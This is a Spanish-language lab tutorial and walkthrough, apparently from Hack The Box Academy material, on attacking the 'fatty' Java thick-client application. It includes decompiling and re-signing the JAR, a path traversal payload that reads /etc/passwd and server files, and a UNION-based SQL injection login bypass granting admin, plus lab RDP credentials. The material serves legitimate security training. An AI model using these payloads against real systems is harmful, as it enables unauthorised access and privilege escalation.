
# Vulnerabilidades Web en Aplicaciones de Cliente Pesado

Las aplicaciones de cliente pesado con una arquitectura de tres niveles tienen una ventaja de seguridad sobre las que tienen una arquitectura de dos niveles, ya que impiden que el usuario final se comunique directamente con el servidor de base de datos. Sin embargo, las aplicaciones de tres niveles pueden ser susceptibles a ataques específicos de la web, como Inyecciones SQL o el Path Traversal

Durante las pruebas de penetración, es habitual que alguien se encuentre con una aplicación cliente pesada que se conecta a un servidor para comunicarse con la base de datos. El siguiente escenario demuestra un caso en el que el pentester encontró los siguientes archivos mientras enumeraba un servidor FTP con acceso `anonymous`.

* `fatty-client.jar`
* `note.txt`
* `note2.txt`
* `note3.txt`

La lectura del contenido de todos los archivos de texto revela que:

* Se ha reconfigurado un servidor para que se ejecute en el puerto `1337` en lugar de `8000`.
* Esta podría ser una arquitectura de cliente pesado/liviano donde la aplicación cliente aún necesita actualizarse para usar el nuevo puerto.
* La aplicación cliente se basa en `Java 8`.
* Las credenciales de inicio de sesión para iniciar sesión en la aplicación cliente son `qtc / clarabibi`.

Ejecutaremos el archivo `fatty-client.jar` haciendo doble clic sobre él. Una vez iniciada la aplicación, podremos iniciar sesión con las credenciales `qtc / clarabibi`.

![errar](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/err.png)

Esto no se ha realizado correctamente y se muestra el mensaje `Connection Error!`. Probablemente esto se deba a que el puerto que apunta a los servidores debe actualizarse de `8000` a `1337`. Capturemos y analicemos el tráfico de red mediante Wireshark para confirmarlo. Una vez que se inicia Wireshark, hacemos clic en `Login` una vez más.

![Tiburón de cables](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/wireshark.png)

A continuación se muestra un ejemplo de cómo abordar las solicitudes DNS de las aplicaciones a su favor. Verifique el contenido del archivo `C:\Windows\System32\drivers\etc\hosts` donde la IP `172.16.17.114` apunta a `fatty.htb` y `server.fatty.htb`

El cliente intenta conectarse al subdominio `server.fatty.htb`. Iniciemos un CMD como administrador y agreguemos la siguiente entrada al archivo `hosts`.

```powershell
C:\> echo 10.10.10.174    server.fatty.htb >> C:\Windows\System32\drivers\etc\hosts
```

Al inspeccionar nuevamente el tráfico se revela que el cliente está intentando conectarse al puerto `8000`.

![puerto](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/port.png)

Se trata de un archivo Java `fatty-client.jar`, y su contenido se puede extraer haciendo clic derecho sobre él y seleccionando `Extract files`.

```powershell
C:\> ls fatty-client\

<SNIP>
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/30/2019  12:10 PM                htb
d-----       10/30/2019  12:10 PM                META-INF
d-----        4/26/2017  12:09 AM                org
------       10/30/2019  12:10 PM           1550 beans.xml
------       10/30/2019  12:10 PM           2230 exit.png
------       10/30/2019  12:10 PM           4317 fatty.p12
------       10/30/2019  12:10 PM            831 log4j.properties
------        4/26/2017  12:08 AM            299 module-info.class
------       10/30/2019  12:10 PM          41645 spring-beans-3.0.xsd
```

Ejecutemos PowerShell como administrador, naveguemos al directorio extraído y usemos el comando `Select-String` para buscar todos los archivos del puerto `8000`.

```powershell
C:\> ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List

Path       : C:\Users\cybervaca\Desktop\fatty-client\beans.xml
LineNumber : 13
```

Hay una coincidencia en `beans.xml`. Este es un archivo `Spring` de configuración que contiene metadatos de configuración. Leamos su contenido.

```powershell
C:\> cat fatty-client\beans.xml

<SNIP>
<!-- Here we have an constructor based injection, where Spring injects required arguments inside the
         constructor function. -->
   <bean id="connectionContext" class = "htb.fatty.shared.connection.ConnectionContext">
      <constructor-arg index="0" value = "server.fatty.htb"/>
      <constructor-arg index="1" value = "8000"/>
   </bean>

<!-- The next to beans use setter injection. For this kind of injection one needs to define an default
constructor for the object (no arguments) and one needs to define setter methods for the properties. -->
   <bean id="trustedFatty" class = "htb.fatty.shared.connection.TrustedFatty">
      <property name = "keystorePath" value = "fatty.p12"/>
   </bean>

   <bean id="secretHolder" class = "htb.fatty.shared.connection.SecretHolder">
      <property name = "secret" value = "clarabibiclarabibiclarabibi"/>
   </bean>
<SNIP>
```

Editemos la línea y establezcamos el puerto en 1337. Leyendo atentamente el contenido, también notamos que el valor del secret es `clarabibiclarabibiclarabibi`. La ejecución de la aplicación editada fallará debido a una discrepancia en el resumen SHA-256. El JAR está firmado, validando los hashes SHA-256 de cada archivo antes de ejecutarlo. Estos hashes están presentes en el archivo `META-INF/MANIFEST.MF.`

```powershell
C:\> cat fatty-client\META-INF\MANIFEST.MF

Manifest-Version: 1.0
Archiver-Version: Plexus Archiver
Built-By: root
Sealed: True
Created-By: Apache Maven 3.3.9
Build-Jdk: 1.8.0_232
Main-Class: htb.fatty.client.run.Starter

Name: META-INF/maven/org.slf4j/slf4j-log4j12/pom.properties
SHA-256-Digest: miPHJ+Y50c4aqIcmsko7Z/hdj03XNhHx3C/pZbEp4Cw=

Name: org/springframework/jmx/export/metadata/ManagedOperationParamete
 r.class
SHA-256-Digest: h+JmFJqj0MnFbvd+LoFffOtcKcpbf/FD9h2AMOntcgw=
<SNIP>
```

Quitemos los hashes `META-INF/MANIFEST.MF` y eliminemos los archivos `1.RSA` y `1.SF` del directorio `META-INF`. La modificación de `MANIFEST.MF` debe terminar con una nueva línea.

```txt
Manifest-Version: 1.0
Archiver-Version: Plexus Archiver
Built-By: root
Sealed: True
Created-By: Apache Maven 3.3.9
Build-Jdk: 1.8.0_232
Main-Class: htb.fatty.client.run.Starter

```

Podemos actualizar y ejecutar el archivo `fatty-client.jar` emitiendo los siguientes comandos.

```powershell
C:\> cd .\fatty-client
C:\> jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *
```

Luego hacemos doble clic sobre el archivo `fatty-client-new.jar` para iniciarlo e intentamos iniciar sesión con las credenciales `qtc / clarabibi`.

![acceso](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/login.png)

Esta vez nos da el mensaje `Login Successful!`.

***

## <mark style="color:purple;">Foothold</mark>

Al hacer clic en `Profile`-> `Whoami` se revela que el usuario `qtc` tiene asignado el rol `user`.

![perfil1](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/profile1.png)

Al hacer clic en `ServerStatus`, nos damos cuenta que no podemos hacer clic en ninguna opción.

![estado](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/status.png)

Esto implica que puede haber otro usuario con mayores privilegios que esté autorizado a utilizar esta función. Al hacer clic en `FileBrowser`-> `Notes.txt` se muestra el archivo `security.txt`. Al hacer clic en la opción `Open` en la parte inferior de la ventana se muestra el siguiente contenido.

![seguridad](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/security.png)

Esta nota nos informa que aún quedan algunos problemas críticos por solucionar en la aplicación. Navegando hasta la opción `FileBrowser`-> se nos muestra el archivo `dave.txt` que contiene información interesante. Podemos leer su contenido haciendo clic en la opción `Open` que se encuentra en la parte inferior de la ventana.

![David](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/dave.png)

El mensaje de Dave dice que todos los usuarios `admin` se eliminaron de la base de datos. También hace referencia a un tiempo de espera implementado en el procedimiento de inicio de sesión para mitigar los ataques de inyección SQL basados ​​en el tiempo.

***

## <mark style="color:purple;">Path Traversal</mark>

Como podemos leer archivos, intentemos un ataque de path traversal proporcionando la siguiente carga útil en el campo y haciendo clic en el botón `Open`.

```txt
../../../../../../etc/passwd
```

![contraseña](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/passwd.png)

El servidor filtra el carácter `/` de la entrada. Descompilamos la aplicación usando [JD-GUI](http://java-decompiler.github.io/) , arrastrando y soltando el `fatty-client-new.jar` en el `jd-gui`.

![jdgui](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/jdgui.png)

Guardamos el código fuente presionando la opción `Save All Sources` en `jdgui`. Descomprimimos el archivo `fatty-client-new.jar.src.zip` haciendo clic derecho y seleccionando `Extract files`. El archivo `fatty-client-new.jar.src/htb/fatty/client/methods/Invoker.java` maneja las características de la aplicación. Al leer su contenido se revela el siguiente código.

```java
public String showFiles(String folder) throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {
      
      }).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user))
      return "Error: Method '" + methodName + "' is not allowed for this user account"; 
    this.action = new ActionMessage(this.sessionID, "files");
    this.action.addArgument(folder);
    sendAndRecv();
    if (this.response.hasError())
      return "Error: Your action caused an error on the application server!"; 
    return this.response.getContentAsString();
  }
```

La función `showFiles` toma un argumento para el nombre de la carpeta y luego envía los datos al servidor mediante la llamada `sendAndRecv()`. El archivo `fatty-client-new.jar.src/htb/fatty/client/gui/ClientGuiTest.java` establece la opción de carpeta. Leamos su contenido.

```java
configs.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            String response = "";
            ClientGuiTest.this.currentFolder = "configs";
            try {
              response = ClientGuiTest.this.invoker.showFiles("configs");
            } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {
              JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
            } catch (IOException e2) {
              JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
            } 
            textPane.setText(response);
          }
        });
```

Podemos reemplazar el nombre de la carpeta `configs` por lo siguiente (`..`).

```java
ClientGuiTest.this.currentFolder = "..";
  try {
    response = ClientGuiTest.this.invoker.showFiles("..");
```

A continuación, compilamos el archivo `ClientGuiTest.Java`.

```powershell
C:\> javac -cp fatty-client-new.jar fatty-client-new.jar.src\htb\fatty\client\gui\ClientGuiTest.java
```

Esto genera varios archivos de clase. Vamos a crear una nueva carpeta y extraer el contenido de `fatty-client.jar` en ella.

```powershell
C:\> mkdir raw
C:\> cp fatty-client-new.jar raw\fatty-client-new-2.jar
```

Navegamos hasta el directorio `raw` y descomprimimos `fatty-client-new-2.jar` haciendo clic derecho y seleccionando `Extract Here`. Sobrescribimos los archivos existentes `htb/fatty/client/gui/*.class` con archivos de clase actualizados.

```powershell
C:\> mv -Force fatty-client-new.jar.src\htb\fatty\client\gui\*.class raw\htb\fatty\client\gui\
```

Finalmente, construimos el nuevo archivo JAR.

```powershell
C:\> cd raw
C:\> jar -cmf META-INF\MANIFEST.MF traverse.jar .
```

Iniciamos sesión en la aplicación y navegamos a `FileBrowser`-> `Config`.

![atravesar](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/traverse.png)

Esto se ha realizado correctamente. Ahora podemos ver el contenido del directorio `configs/../`. Los archivos `fatty-server.jar` y `start.sh` parecen interesantes. Al enumerar el contenido del archivo `start.sh`, se ve que `fatty-server.jar` se está ejecutando dentro de un contenedor Docker de Alpine.

![comenzar](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/start.png)

Podemos modificar función la `open` en `fatty-client-new.jar.src/htb/fatty/client/methods/Invoker.java` para descargar el archivo `fatty-server.jar` de la siguiente manera.

```java
import java.io.FileOutputStream;
<SNIP>
public String open(String foldername, String filename) throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {}).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user)) {
        return "Error: Method '" + methodName + "' is not allowed for this user account";
    }
    this.action = new ActionMessage(this.sessionID, "open");
    this.action.addArgument(foldername);
    this.action.addArgument(filename);
    sendAndRecv();
    String desktopPath = System.getProperty("user.home") + "\\Desktop\\fatty-server.jar";
    FileOutputStream fos = new FileOutputStream(desktopPath);
    
    if (this.response.hasError()) {
        return "Error: Your action caused an error on the application server!";
    }
    
    byte[] content = this.response.getContent();
    fos.write(content);
    fos.close();
    
    return "Successfully saved the file to " + desktopPath;
}
<SNIP>
```

Reconstruímos el archivo JAR siguiendo los mismos pasos e iniciamos sesión nuevamente en la aplicación. Luego, navegamos hasta `FileBrowser`-> `Config`, agregamos el nombre `fatty-server.jar` en el campo de entrada y hacemos clic en el botón `Open`.

![descargar](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/download.png)

El archivo `fatty-server.jar` se ha descargado correctamente en nuestro escritorio y podemos comenzar el examen.

```powershell
C:\> ls C:\Users\cybervaca\Desktop\

...SNIP...
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/25/2023  11:38 AM       10827452 fatty-server.jar
```

***

## <mark style="color:purple;">Inyección SQL</mark>

Al descompilar el archivo `fatty-server.jar` usando JD-GUI, se revela el archivo `htb/fatty/server/database/FattyDbSession.class` que contiene una función `checkLogin()` que maneja la funcionalidad de inicio de sesión. Esta función recupera los detalles del usuario en función del nombre de usuario proporcionado. Luego, compara la contraseña recuperada con la contraseña proporcionada.

```java
public User checkLogin(User user) throws LoginException {
    <SNIP>
      rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");
      <SNIP>
        if (newUser.getPassword().equalsIgnoreCase(user.getPassword()))
          return newUser; 
        throw new LoginException("Wrong Password!");
      <SNIP>
           this.logger.logError("[-] Failure with SQL query: ==> SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "' <==");
      this.logger.logError("[-] Exception was: '" + e.getMessage() + "'");
      return null;
```

Veamos cómo la aplicación cliente envía credenciales al servidor. El botón de inicio de sesión crea el nuevo objeto `ClientGuiTest.this.user` para la clase `User`. A continuación, llama a las funciones `setUsername()`y `setPassword()`con los valores de nombre de usuario y contraseña correspondientes. Los valores que se devuelven de estas funciones se envían al servidor.

![código de inicio de sesión](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/logincode.png)

Revisemos las funciones `setUsername()` y `setPassword()`de `htb/fatty/shared/resources/user.java`.

```java
public void setUsername(String username) {
    this.username = username;
  }
  
  public void setPassword(String password) {
    String hashString = this.username + password + "clarabibimakeseverythingsecure";
    MessageDigest digest = null;
    try {
      digest = MessageDigest.getInstance("SHA-256");
    } catch (NoSuchAlgorithmException e) {
      e.printStackTrace();
    } 
    byte[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));
    this.password = DatatypeConverter.printHexBinary(hash);
  }
```

El nombre de usuario se acepta sin modificaciones, pero la contraseña se cambia al formato que se muestra a continuación.

```java
sha256(username+password+"clarabibimakeseverythingsecure")
```

También observamos que el nombre de usuario no está desinfectado y se usa directamente en la consulta SQL, lo que lo hace vulnerable a la inyección SQL.

```java
rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");
```

La función `checkLogin` de `htb/fatty/server/database/FattyDbSession.class` escribe la excepción SQL en un archivo de registro.

```java
<SNIP>
    this.logger.logError("[-] Failure with SQL query: ==> SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "' <==");
      this.logger.logError("[-] Exception was: '" + e.getMessage() + "'");
<SNIP>
```

Al iniciar sesión en la aplicación con el nombre de usuario `qtc'` para validar la vulnerabilidad de inyección SQL, se revela un error de sintaxis. Para ver el error, debemos editar el código en el archivo `fatty-client-new.jar.src/htb/fatty/client/gui/ClientGuiTest.java` de la siguiente manera.

```java
ClientGuiTest.this.currentFolder = "../logs";
  try {
    response = ClientGuiTest.this.invoker.showFiles("../logs");
```

Al enumerar el contenido del archivo `error-log.txt` aparece el siguiente mensaje.

![error](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/error.png)

Esto confirma que el campo de nombre de usuario es vulnerable a inyecciones SQL. Sin embargo, los intentos de inicio de sesión con payloads como `' or '1'='1` en ambos campos fallan. Suponiendo que el nombre de usuario en el formulario de inicio de sesión es `' or '1'='1`, el servidor procesará el nombre de usuario como se muestra a continuación.

```sql
SELECT id,username,email,password,role FROM users WHERE username='' or '1'='1'
```

La consulta anterior se ejecuta correctamente y devuelve el primer registro de la base de datos. A continuación, el servidor crea un nuevo objeto de usuario con los resultados obtenidos.

```java
<SNIP>
if (rs.next()) {
        int id = rs.getInt("id");
        String username = rs.getString("username");
        String email = rs.getString("email");
        String password = rs.getString("password");
        String role = rs.getString("role");
        newUser = new User(id, username, password, email, Role.getRoleByName(role), false);
<SNIP>
```

Luego compara la contraseña de usuario recién creada con la contraseña proporcionada por el usuario.

```java
<SNIP>
if (newUser.getPassword().equalsIgnoreCase(user.getPassword()))
    return newUser;
throw new LoginException("Wrong Password!");
<SNIP>
```

Luego, la función produce el siguiente valor `newUser.getPassword()`.

```java
sha256("qtc"+"clarabibi"+"clarabibimakeseverythingsecure") = 5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046
```

El hash de la contraseña proporcionada por el usuario `user.getPassword()`se calcula de la siguiente manera.

```java
sha256("' or '1'='1" + "' or '1'='1" + "clarabibimakeseverythingsecure") = cc421e01342afabdd4857e7a1db61d43010951c7d5269e075a029f5d192ee1c8
```

Aunque el hash enviado al servidor por el cliente no coincide con el de la base de datos y la comparación de contraseñas falla, la inyección SQL sigue siendo posible mediante consultas `UNION`. Consideremos el siguiente ejemplo.

```sql
MariaDB [userdb]> select * from users where username='john';
+----------+-------------+
| username | password    |
+----------+-------------+
| john     | password123 |
+----------+-------------+
```

Es posible crear entradas falsas utilizando el operador `SELECT`. Ingresemos un nombre de usuario no válido para crear una nueva entrada de usuario.

```sql
MariaDB [userdb]> select * from users where username='test' union select 'admin', 'welcome123';
+----------+-------------+
| username | password    |
+----------+-------------+
| admin    | welcome123  |
+----------+-------------+
```

De manera similar, la inyección en el campo `username` se puede aprovechar para crear una entrada de usuario falsa.

```java
test' UNION SELECT 1,'invaliduser','invalid@a.b','invalidpass','admin
```

De esta manera, se puede controlar la contraseña y el rol asignado. El siguiente fragmento de código envía la contraseña en texto plano ingresada en el formulario. Modifiquemos el código de `htb/fatty/shared/resources/User.java` para enviar la contraseña tal como está desde la aplicación cliente.

```java
public User(int uid, String username, String password, String email, Role role) {
    this.uid = uid;
    this.username = username;
    this.password = password;
    this.email = email;
    this.role = role;
}
public void setPassword(String password) {
    this.password = password;
  }
```

Ahora podemos reconstruir el archivo JAR e intentar iniciar sesión utilizando el payload `abc' UNION SELECT 1,'abc','a@b.com','abc','admin` en el campo `username` y el texto aleatorio `abc` en el campo `password`.

![derivación](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/bypass.png)

El servidor eventualmente procesará la siguiente consulta.

```sql
select id,username,email,password,role from users where username='abc' UNION SELECT 1,'abc','a@b.com','abc','admin'
```

La primera consulta de selección falla, mientras que la segunda devuelve resultados de usuario válidos con el rol `admin` y la contraseña `abc`. La contraseña enviada al servidor también es `abc`, lo que da como resultado una comparación de contraseñas exitosa y la aplicación nos permite iniciar sesión como el usuario `admin`.

![administración](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/admin.png)

***

## <mark style="color:purple;">Caso práctico</mark>

```
RDP a 10.129.228.115 (ACADEMY-ACA-PIVOTAPI)
User "cybervaca"
Password "&aue%C)}6g-d{w"
```

> ¿Cuál es la dirección IP de la interfaz eth0 en la pestaña `ServerStatus -> Ipconfig` en la aplicación fatty-client?

### Escaneo de puertos

```bash
sudo nmap -v -sV -T5 10.129.228.115  
```

```bash
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-31 14:08:04Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: LicorDeBellota.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: LicorDeBellota.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: PIVOTAPI; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Vamos un puerto 21 FTP abierto. Vamos a descargarnos todos los archivos

### FTP Download

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ wget -r ftp://10.129.54.64/   
</strong>                                         
--2025-02-05 20:04:28--  ftp://10.129.54.64/
           => «10.129.54.64/.listing»
Conectando con 10.129.54.64:21... conectado.
Identificándose como anonymous ... ¡Dentro!
==> SYST ... hecho.   ==> PWD ... hecho.
==> TYPE I ... hecho.  ==> no se necesita CWD.
==> PASV ... hecho.   ==> LIST ... hecho.

10.129.54.64/.listing                         [ &#x3C;=>                                                                                 ]     206  --.-KB/s    en 0s      

==> PASV ... hecho.   ==> LIST ... hecho.

10.129.54.64/.listing                         [ &#x3C;=>                                                                                 ]     206  --.-KB/s    en 0s      

2025-02-05 20:04:29 (7,21 MB/s) - «10.129.54.64/.listing» guardado [412]

«10.129.54.64/.listing» eliminado.
--2025-02-05 20:04:29--  ftp://10.129.54.64/fatty-client.jar
           => «10.129.54.64/fatty-client.jar»
==> no se requiere CWD.
==> PASV ... hecho.   ==> RETR fatty-client.jar ... hecho.
Longitud: 15426727 (15M)

10.129.54.64/fatty-client.jar             100%[====================================================================================>]  14,71M   353KB/s    en 42s     

2025-02-05 20:05:12 (355 KB/s) - «10.129.54.64/fatty-client.jar» guardado [15426727]
</code></pre>

Encontramos 3 archivos interesantes, vamos a descargarlos.

```shell-session
afsh4ck@kali$ ls

fatty-client.jar  note.txt  note2.txt  note3.txt
```

La lectura del contenido de todos los archivos de texto revela que:

* Se ha reconfigurado un servidor para que se ejecute en el puerto `1337` en lugar de `8000`.
* Esta podría ser una arquitectura de cliente pesado/liviano donde la aplicación cliente aún necesita actualizarse para usar el nuevo puerto.
* La aplicación cliente se basa en `Java 8`.
* Las credenciales de inicio de sesión para iniciar sesión en la aplicación cliente son `qtc / clarabibi`.

### Edición del ejecutable

Vamos a extraer fatty-client.jar:

```powershell
PS C:\Users\cybervaca\Downloads\fatty-client> ls

    Directory: C:\Users\cybervaca\Downloads\fatty-client

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/30/2019  12:10 PM                htb
d-----       10/30/2019  12:10 PM                META-INF
d-----        4/26/2017  12:09 AM                org
------       10/30/2019  12:10 PM           1550 beans.xml
------       10/30/2019  12:10 PM           2230 exit.png
-a----        1/31/2025   3:17 PM       15426727 fatty-client.jar
------       10/30/2019  12:10 PM           4317 fatty.p12
------       10/30/2019  12:10 PM            831 log4j.properties
------        4/26/2017  12:08 AM            299 module-info.class
------       10/30/2019  12:10 PM          41645 spring-beans-3.0.xsd
```

Ahora buscamos las líneas que contengan el puerto 8000:

```powershell
PS C:\Users\cybervaca\Downloads\fatty-client> ls -recurse | Select-String "8000" | Select Path, LineNumber | Format-List


Path       : C:\Users\cybervaca\Downloads\fatty-client\beans.xml
LineNumber : 13
```

Editamos el archivo beans.xml en la línea del puerto 8000 y establecemos el puerto en `1337`

```powershell
PS C:\Users\cybervaca\Downloads\fatty-client> cat .\beans.xml

<?xml version = "1.0" encoding = "UTF-8"?>

<beans xmlns="http://www.springframework.org/schema/beans"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="
                http://www.springframework.org/schema/beans
                spring-beans-3.0.xsd">

<!-- Here we have an constructor based injection, where Spring injects required arguments inside the
         constructor function. -->
   <bean id="connectionContext" class = "htb.fatty.shared.connection.ConnectionContext">
      <constructor-arg index="0" value = "server.fatty.htb"/>
      <constructor-arg index="1" value = "1337"/>
   </bean>

<----SNIP---->
```

Quitamos los hashes del archivo `META-INF/MANIFEST.MF` y eliminemos los archivos `1.RSA` y `1.SF` del directorio `META-INF`. La modificación de `MANIFEST.MF` debe terminar con una nueva línea.

```txt
Manifest-Version: 1.0
Archiver-Version: Plexus Archiver
Built-By: root
Sealed: True
Created-By: Apache Maven 3.3.9
Build-Jdk: 1.8.0_232
Main-Class: htb.fatty.client.run.Starter

```

Podemos actualizar y ejecutar el archivo `fatty-client.jar` emitiendo los siguientes comandos.

```powershell
C:\> cd .\fatty-client
C:\> jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *
```

Luego hacemos doble clic sobre el archivo `fatty-client-new.jar` para iniciarlo e intentamos iniciar sesión con las credenciales `qtc / clarabibi`.

<figure><img src="/files/NXnsZsFjv8mHrNi6pNn3" alt=""><figcaption></figcaption></figure>

La ejecutamos de nuevo y tenemos un login successfull:

<figure><img src="/files/cK6ynikuxPpC3uOyTRPb" alt=""><figcaption></figcaption></figure>

### Explotación

No podemos acceder a la pestaña `Ipconfig` en Server Status, que es el objetivo del caso práctico, por lo que tendremos que intentar desbloquear esa funcionalidad:

<figure><img src="/files/x1p6bbnaZCCucHqN5n7o" alt=""><figcaption></figcaption></figure>

Vamos a decompilar la aplicación con `jd-gui`. Lo guardamos en la ruta `C:\Apps`

### Inyección SQL

#### **1. Modificar el código del cliente para desactivar el hashing de contraseñas:**

* **Archivo:** `htb/fatty/shared/resources/User.java`
* **Cambios necesarios:**

```java
public void setPassword(String password) {
    String hashString = this.username + password + "clarabibimakeseverythingsecure";
    MessageDigest digest = null;
    try {
      digest = MessageDigest.getInstance("SHA-256");
     } catch (NoSuchAlgorithmException e) {
       e.printStackTrace();
    } 
    byte[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));
     this.password = DatatypeConverter.printHexBinary(hash);
}
```

```java
public void setPassword(String password) {
    // Eliminar el hashing y guardar la contraseña en texto plano
    this.password = password;
}
```

***

#### **2. Recompilar y reconstruir el JAR modificado (desde `C:\Apps`):**

```powershell
# 1. Eliminar compilaciones anteriores
rm -r compiled_classes
mkdir compiled_classes

# 2. Compilar la clase User.java modificada
javac -cp "fatty-client-new.jar" -d compiled_classes "fatty-client-new.jar.src\htb\fatty\shared\resources\User.java"

# 3. Actualizar el JAR original con la clase modificada
jar uf fatty-client-new.jar -C compiled_classes htb/fatty/shared/resources/User.class

# 4. Crear JAR ejecutable final
cp fatty-client-new.jar fatty-client-patched.jar
```

***

#### **3. Explotar la inyección SQL:**

**Payload de nombre de usuario:**

```
abc' UNION SELECT 1,'abc','a@b.com','abc','admin
```

**Contraseña:** `abc` (texto plano, sin hashing).

<figure><img src="/files/TJ8Esjownz6pFaqTiEdq" alt=""><figcaption></figcaption></figure>

Vemos que se han desabloqueado todas las funcionalidades porque somos admin, y conseguimos acceder a la pestaña de Ipconfig:

<figure><img src="/files/zKqDWN42YQdeZPxp15cd" alt=""><figcaption></figcaption></figure>
